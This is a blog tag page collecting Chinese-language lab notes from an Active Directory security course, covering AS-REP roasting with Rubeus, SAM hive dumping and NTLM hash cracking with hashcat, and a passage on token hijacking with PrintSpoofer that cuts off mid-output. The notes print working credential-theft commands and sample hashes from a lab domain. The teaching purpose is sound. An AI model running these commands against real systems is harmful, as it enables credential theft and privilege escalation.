<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tags/ad/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="AD"><meta property="og:locale" content="en_us"><meta property="og:type" content="website"><title>AD | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tags/ad/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script><link rel=alternate type=application/rss+xml href=https://bernie6401.github.io/tags/ad/index.xml title="SBK Hugo Site"></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>AD</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>名詞解釋</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>讀書心得</a>
<span>2</span></li></ul></li></ul></nav></aside></header><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/>NTUSTISC - AD Note - Lab(AS-REP Roasting)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---labas-rep-roasting>NTUSTISC - AD Note - Lab(AS-REP Roasting)
<a class=anchor href=#ntustisc---ad-note---labas-rep-roasting>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/ubNMQ7_dcm0?si=CRVWKo4tnpx3LqxK">2022/05/11 AD 安全 2</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=https://www.tsnien.idv.tw/Security_WebBook/chap14/14-4%20Kerberos%20%E8%AA%8D%E8%AD%89%E7%B3%BB%E7%B5%B1%E7%B0%A1%E4%BB%8B.html>第十四章 Kerberos 認證系統</a></p><ul><li>簡介：這是一種計算機網路授權協議，簡單說如果在同一個domain底下，想要存取某一個server的某項服務，則要如何驗證該使用者的身分以及授權他使用該項服務的資格?換個角度想，如果不認證會怎麼樣?首先，如果不認證使用者身分，就直接讓授權使用該項服務，則最直觀的攻擊就是DoS，或是駭客可以透過該項服務打到內網$\to$提權$\to$橫向移動$\to$APT，看起來很危險；另外一方面，如果有驗證身分，但通過驗證的人一率給予使用服務的授權，又會怎麼樣?可以利用eavesdropping得到授權的ticket再利用reply attack還是可以偽造身分</li><li>提醒：Windows Kerberos和MIT Kerberos在實作上有一點不一樣，如果想要知道windows kerberos可以看飛飛的文章<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup><sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup>，然後自行比對粘添壽老師的影片</li><li>MIT Kerberos架構：
<img src=https://www.tsnien.idv.tw/Security_WebBook/Security_%E6%8F%92%E5%9C%96/%E5%9C%96%2014-8.png alt>
為了防止前面提到的問題，他增加了一個TGS的Server，但純控管tickets的發放，另外在驗證上面也增加了timestamp和請求方的網路位址，這樣就可以防止reply attack，而且短時間內都不需要再進行身分認證，很方便</li><li>Windows Kerberos架構：
<img src=https://hackmd.io/_uploads/BkTzOxN1T.png alt></li><li>優點<blockquote><ul><li>主密鑰分配：AS 伺服器除了必須擁有客戶的主密鑰之外，還必須擁有 TGS 的主密鑰；另外，TGS 伺服器也需要擁有所有伺服器的主密鑰。這就是 Kerberos 將所有參與者都稱為 Principal 的主要原因。</li><li>客戶密碼只要輸入一次：客戶端取得通往 TGS 的門票（TicketTGS）之後，在該票的有效期限之內，都可以請求服務，而不需要再輸入密碼來索取門票。</li><li>防禦偽裝攻擊：門票（TicketTGS與 TicketB）上有登錄該票的使用者識別（ID）、工作站位址（AD）、時間戳記（TS）與有效期間（Lifetime）。攻擊者攔截到門票之後，不易在在有效期內偽裝成合法客戶。</li><li>防止重播攻擊：門票有註明時間戳記（T），當攻擊者重播門票時，接收端可以利用時間戳記辨別門票的新舊。</li></ul></blockquote></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=as-rep-roasting>==AS-REP Roasting==
<a class=anchor href=#as-rep-roasting>#</a></h3><ul><li>攻擊情境：在Win2016的Server Manager中的Tools可以找到Active Directory User and Computer
<img src=https://hackmd.io/_uploads/H1JCrlEyT.png alt>
在一般user的property中，可以看到Account/Account options最底下有一個選項==Do not require Kerberos preauthentication==，這個功能主要是前面提到的對於身分不會認證(1, 2步驟會略過，只執行3-6)，他只會認證後面的ticket
<img src=https://hackmd.io/_uploads/BJidLxV1a.png alt>
雖然預設是不勾選，但有兩種情況會打勾<ol><li>如果被駭客打進去到最高管理員，當然它會勾選這個功能方便搞事(所有帳號)</li><li>因為windows有分版本，如果要向下兼容各版本之間的認證，則該選項就一定要勾選(這也是為甚麼講師在前面有提到一定要升級AD的舊環境)，這在很古老的系統中常常發生</li></ol></li><li>滿足條件：只要前面提到的功能被打開，就可以進行AS-REP Roasting</li><li>如何攻擊：<ul><li>自己把Microsoft的document看懂如何pack一個packet，然後自己實作</li><li>另一種方式就直接用工具<a href=https://github.com/GhostPack/Rubeus/releases/tag/1.6.4>Rubeus 1.6.4</a>，他可以直接把有勾選該項目的帳號，送出AS-REQ的請求，然後接收AS-REP的回應，並把接收到的tickets以你指定的格式印出來</li><li>Cheat Sheet:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ Rubeus.exe asreproast
</span></span><span style=display:flex><span>$ Rubeus.exe asreproast /format:hashcat /outfile:out.txt
</span></span></code></pre></div></li></ul><hr><h4 id=實際執行>實際執行
<a class=anchor href=#%e5%af%a6%e9%9a%9b%e5%9f%b7%e8%a1%8c>#</a></h4><ol><li>Using Rubeus.exe
:::spoiler Result</li></ol><pre tabindex=0><code class=language-bash! data-lang=bash!>$ Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: AS-REP roasting

[*] Target Domain          : kuma.org

[*] Searching path &#39;LDAP://WIN-818G5VCOLJO.kuma.org/DC=kuma,DC=org&#39; for AS-REP roastable users
[*] SamAccountName         : reyna.gwendolyn
[*] DistinguishedName      : CN=Reyna Gwendolyn,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: &#39;kuma.org\reyna.gwendolyn&#39;
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$reyna.gwendolyn@kuma.org:4B08601B0A55BA231BED4333EAA6ED9C$E146006C2F6
      B5EF8D78D4280E646FA601860D754261C28DC48470F2EA99E75DFD03E53F4BAC09BD1BE9697C5918
      C48E5BA6A64D51A550FC6833327EBEF9A0C62F2448BA3CA3AA7D9BD375BF8BE693B1BC199A442053
      AC3A40FA3F29EE3ABFB9B1B1E1C31DDD508FAB7971F1FDCE057D5A4481678511188DB99921762116
      934D04C72071DAACFC6FFA8250380CD9ECECF95CC5702FD7A67AB90F18C299BB9AD8FF4A9325730E
      859F2105F1AF64E170EB118111414CC44D0CDD1199860EF0D99ECD33FB618FEDCFAE96E0DFB75A4D
      9EF3C06C99DBBD9C0A69A344C4C5A65B5B702152081F9

[*] SamAccountName         : henrieta.sabine
[*] DistinguishedName      : CN=Henrieta Sabine,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: &#39;kuma.org\henrieta.sabine&#39;
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$henrieta.sabine@kuma.org:DEBC5F5111CE6D774625EB3DCC14925A$A91DD569550
      A48219DAC0F53E4114DA7027E073DD6A86EFC83C79206787A84DBF6FC7F4B5168D7CBE65B073A05B
      B13AF1514D32D787948F91E05FF40191B6FE7819B9F5A978377D82B5E9532688B1CF28BBA1370365
      68C110CAB41FEC26D262DC422CB54B678456470AE34F23B6D2CB1597E9565CACD11C1C5F9683408B
      241650007B0E162C40D7694D8F5A5154254E0A54829C7784EB5493DF15812271C3161DD5937B368B
      93406383215D909289E3FE096A10D396EF662C02031E6D4352C6A411EEC38B0A1D02A2E0AB03C86E
      CBF9C07C441C4D5EBD4269400373A2AFAD5879293B856

[*] SamAccountName         : giulietta.moyra
[*] DistinguishedName      : CN=Giulietta Moyra,CN=Users,DC=kuma,DC=org
[*] Using domain controller: WIN-818G5VCOLJO.kuma.org (192.168.222.128)
[*] Building AS-REQ (w/o preauth) for: &#39;kuma.org\giulietta.moyra&#39;
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$giulietta.moyra@kuma.org:11CD5E39C2CEA9695C50826E6FCA66D3$9E2B2F3ED60
      5D93BF02721F921D09DE188F1F7F3BE23907A73B95B30ECB0C1CFF5C68A0E814931A6A839DC1098C
      2F3EF8B0A68492CA16E6CD96C843373581DD8CF14F7F58AE9B63A4717D1E8F7C2AA56DAC959F589C
      1533249CA5BF72BBFC833609A0D958B7B5E692632D3557678B671E65C092494B38FC3840D09E16F4
      1FE8D1BB86FAF16BD3F39E4E8CF8AC07A10FCD20E947D3A496A4204350D1E3B0448DB92AE749F3D0
      7A9D1582677A5958B70DD38E2CDFC914C2848D0F9BC0E78D65AB7F3B9E1B5AFFA53588FBD7FFB297
      357047776932B4EA2405ECB5705418BDE7CB8DBE725BB
</code></pre><p>:::
可以看到他總共吐出了三個hash，分別對應到三個使用者：<font color=FF0000>reyna.gwendolyn, henrieta.sabine, henrieta.sabine</font>，如果仔細對應win2016相對使用者的property會發現的確，這三個user的該選項都有打勾，現在則是利用hashcat之類的工具把hash暴力解開</p><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x21as-rep-roasting/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/>NTUSTISC - AD Note - Lab(Brute Force SAM)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---labbrute-force-sam>NTUSTISC - AD Note - Lab(Brute Force SAM)
<a class=anchor href=#ntustisc---ad-note---labbrute-force-sam>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=l1na5hFGpAPk6Uux&amp;t=4257">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p>得到更高權限之後，會想要更多的密碼</p><ul><li>密碼收集<ul><li>SAM.hive(Security Account Manager)<ul><li>What: 就是一個用於windows的數據庫文件，用於==儲存用戶的密碼==，並且對於本地端或遠端的使用者進行身分認證</li><li>Where: <code>C:\Windows\System32\config\SAM</code></li></ul></li><li>Password Spraying(用猜的)</li><li>GPO</li><li>記憶體(lsass)</li></ul></li></ul><h2 id=lab>Lab
<a class=anchor href=#lab>#</a></h2><h3 id=brute-force-sam>==Brute Force SAM==
<a class=anchor href=#brute-force-sam>#</a></h3><p>前面有提到SAM在哪裡，所以只要直接打開就看的到密碼了嗎?你會得到一個access denied的錯誤，原因是他已經被設定成read lock了，導致目前無法正常存取
<img src=https://hackmd.io/_uploads/SyEUVnMRn.png alt></p><ol><li>匯出SAM File
主要目的就是把SAM file和SYSTEM file dump下來，而方法就是利用reg.exe(Windows註冊碼工具)，用指令的方式存取<pre tabindex=0><code class=language-bash! data-lang=bash!>$ reg save HKLM\SAM &lt;save filename&gt;
$ reg save HKLM\SYSTEM &lt;save filename&gt;
</code></pre><ul><li>錯誤的方式
但經過cmd用普通權限實測會發現我們沒有這樣的資格<pre tabindex=0><code class=language-bash! data-lang=bash!>$ reg save HKLM\SAM SAM.dump
錯誤: 用戶端沒有這項特殊權限。
</code></pre>其實也很合理，不然所有人都可以直接存取意味著只要摸到其中一臺普通權限的AD，所有機敏資料都會外洩，這就是為甚麼前面需要提權的原因，只有最高權限的帳戶可以存取這兩個file</li><li>正確的方式-1
用前面提到的web shell，打出以下指令，則SAM file就會dump到<code>C:\inetpub\wwwroot\sam.zip</code><pre tabindex=0><code class=language-bash! data-lang=bash!>$ c:\tools\PrintSpoofer64.exe -c &#34;reg save HKLM\SAM C:\inetpub\wwwroot\sam&#34;
</code></pre></li><li>正確的方式-2
利用<a href=https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1>Invoke-NinjaCopy.ps1</a>這個腳本，就可以複製出來，原理是使用windows的影子複製<pre tabindex=0><code class=language-bash! data-lang=bash!>$ .\Invoke-NinjaCopy -Path SAM -LocalDestination C:\tools\SAM_COPY
</code></pre>但是經過實測，發現執行雖然有成功但是沒有任何檔案被dump出來，可能中間有些過程有誤?
:::info
如果要用這個方法，PowerShell要以管理員權限打開，然後如果有遇到如下error message，可以參考這邊<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup>解決問題<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>.<span style=color:#ae81ff>\I</span>nvoke-NinjaCopy : 因為這個系統上已停用指令碼執行，所以無法載入 C:<span style=color:#ae81ff>\t</span>ools<span style=color:#ae81ff>\I</span>nvoke-NinjaCopy.ps1 檔案。如需詳細資訊，請參閱 about_Execution_Policies，網址為 https:/go.microsoft.com/fwlink/?LinkID<span style=color:#f92672>=</span>135170。
</span></span><span style=display:flex><span>位於 線路:1 字元:1
</span></span><span style=display:flex><span>+ .<span style=color:#ae81ff>\I</span>nvoke-NinjaCopy -Path C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onfig<span style=color:#ae81ff>\S</span>AM -LocalDestina ...
</span></span><span style=display:flex><span>+ ~~~~~~~~~~~~~~~~~~
</span></span><span style=display:flex><span>    + CategoryInfo          : SecurityError: <span style=color:#f92672>(</span>:<span style=color:#f92672>)</span> <span style=color:#f92672>[]</span>, PSSecurityException
</span></span><span style=display:flex><span>    + FullyQualifiedErrorId : UnauthorizedAccess
</span></span></code></pre></div>:::</li></ul></li><li>解析SAM內容
拿到SAM的內容之後還需要解析他，可以用kali的samdump2解析<ul><li>Win10 v1607之前的解法<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ samdump2 system sam 
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></code></pre></div><img src=https://hackmd.io/_uploads/HyJXHazCn.png alt>
可以看到很多都是disabled，就代表我們要用下面的解法</li><li>Win10 v1607之後
因為這個版本之後有用到AES加密，所以可以用<a href=https://github.com/CiscoCXSecurity/creddump7>Creddump7</a>，建議使用anaconda這樣的虛擬環境，不然直接用內建的virtualenv會出事，<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ conda activate py2.7
</span></span><span style=display:flex><span>$ pip install pycrypto
</span></span><span style=display:flex><span>$ git clone https://github.com/CiscoCXSecurity/creddump7.git
</span></span><span style=display:flex><span>$ python pwdump.py system sam
</span></span><span style=display:flex><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:7ecffff0c3548187607a14bad0f88bb1:::
</span></span><span style=display:flex><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:e3180c5331aad6ad1ac787749e6c4819:::
</span></span><span style=display:flex><span>user:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span><span style=display:flex><span>low:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span></span></code></pre></div></li></ul></li><li>解析Hash<ul><li>方法一：用online database
接著就是把NTLM Hash丟到隨便的database看有沒有紀錄，例如<a href=https://www.cmd5.com/>cmd5</a>，如果把最前面找到的<code>31d6cfe0d16ae931b73c59d7e0c089c0</code>會顯示空密碼，但我們都知道是錯的
<img src=https://hackmd.io/_uploads/SkKrp6zCn.png alt>
而如果拿Creddump解析出來的<code>7ecffff0c3548187607a14bad0f88bb1</code>，就可以直接顯示出我們的密碼
<img src=https://hackmd.io/_uploads/H1ZAhpz02.png alt></li><li>方法二：爆字典檔
在kali中的/usr/share/wordlists有一些字典檔可以用，例如rockyou等等，可以先用看看<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo gunzip /usr/share/wordlists/rockyou.txt.gz
</span></span><span style=display:flex><span>$ cp /usr/share/wordlists/rockyou.txt ./
</span></span><span style=display:flex><span>$ hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>1000</span> ntlm.hash rockyou.txt --force
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>31d6cfe0d16ae931b73c59d7e0c089c0:                         
</span></span><span style=display:flex><span>7ecffff0c3548187607a14bad0f88bb1:1qaz@WSX3edc
</span></span><span style=display:flex><span>...
</span></span></code></pre></div></li></ul></li></ol><h1 id=reference>Reference
<a class=anchor href=#reference>#</a></h1><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p><a href=https://hackercat.org/windows/powershell-cannot-be-loaded-because-the-execution-of-scripts-is-disabled-on-this-system>PowerShell 「系統上已停用指令碼執行」解決方法</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p><a href=/security/course/ntust-isc/ad/3.-%E6%9B%B4%E5%A4%9A%E5%AF%86%E7%A2%BC/ntustisc---ad-note---lab0x13brute-force-sam/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntust-isc/ad/2.-%E6%8F%90%E5%8D%87%E6%AC%8A%E9%99%90/ntustisc---ad-note---lab0x10hijack-token/>NTUSTISC - AD Note - Lab(Hijack Token)</a></h2><div class=text-small><a href=/tags/ntustisc/>NTUSTISC</a>,
<a href=/tags/ad/>AD</a>,
<a href=/tags/information-security/>Information Security</a></div><p><h1 id=ntustisc---ad-note---labhijack-token>NTUSTISC - AD Note - Lab(Hijack Token)
<a class=anchor href=#ntustisc---ad-note---labhijack-token>#</a></h1><p>[TOC]</p><p>Lecture Video: <a href="https://youtu.be/Cv2gNQkDM8Q?si=M0LV3dBCMCOy58LN&amp;t=3600">2022/05/04 AD 安全1</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><ul><li>提權方法<ul><li>利用弱點</li><li>Hijack Token<ul><li>Tools: <a href=https://github.com/itm4n/PrintSpoofer>PrintSpoofer</a></li><li>Support: Windows 8.1/Server 2012 R2/10/Server 2019</li><li>How to use: <code>$ PrintSpoofer.exe -c "command"</code></li></ul></li><li>Guess Password</li><li>管理服務</li><li>錯誤配置</li></ul></li></ul><h2 id=lab-time---本地提權>Lab Time - 本地提權
<a class=anchor href=#lab-time---%e6%9c%ac%e5%9c%b0%e6%8f%90%e6%ac%8a>#</a></h2><h3 id=hijack-tokennetwork-service>==Hijack Token(Network Service)==
<a class=anchor href=#hijack-tokennetwork-service>#</a></h3><p>這邊講師示範的是，如何利用IIS的特殊權限，達成提權。
先解釋一下，如果要使用PrintSpoofer之類的工具有個特殊的條件，就是需要有特殊權限，也就是
:::info</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ whoami /priv
</code></pre><p>需要有下列其一權限:
SeImpersonatePrivilege => CreateProcessWithToken()
SeAddignPrimaryToekn => CreateProcessAsUser()
:::</p><ol><li><p>whoami /priv
我們先看一下正常使用者的特殊權限有哪些</p><pre tabindex=0><code class=language-bash! data-lang=bash!>$ whoami /priv

PRIVILEGES INFORMATION
----------------------

特殊權限名稱                  描述               狀況
============================= ================== ======
SeShutdownPrivilege           關閉系統           已停用
SeChangeNotifyPrivilege       略過周遊檢查       已啟用
SeUndockPrivilege             從擴充座移除電腦   已停用
SeIncreaseWorkingSetPrivilege 增加處理程序工作組 已停用
SeTimeZonePrivilege           變更時區           已停用
